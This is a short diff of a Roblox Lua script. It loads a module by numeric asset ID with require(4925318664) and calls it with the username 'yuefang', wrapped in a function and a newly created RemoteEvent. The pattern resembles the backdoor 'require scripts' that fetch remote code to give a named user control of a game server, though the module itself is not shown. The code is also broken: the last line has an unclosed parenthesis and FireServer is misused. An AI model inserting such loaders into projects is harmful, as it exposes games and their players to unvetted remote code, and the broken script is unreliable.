@@ -1,1 +1,7 @@
-require(4925318664):Fire("yuefang")
+local Event = Instance.new("RemoteEvent",game.ReplicatedStorage)
+
+local function xDlmao()
+	require(4925318664):Fire("yuefang")
+end
+
+Event:FireServer(xDlmao()
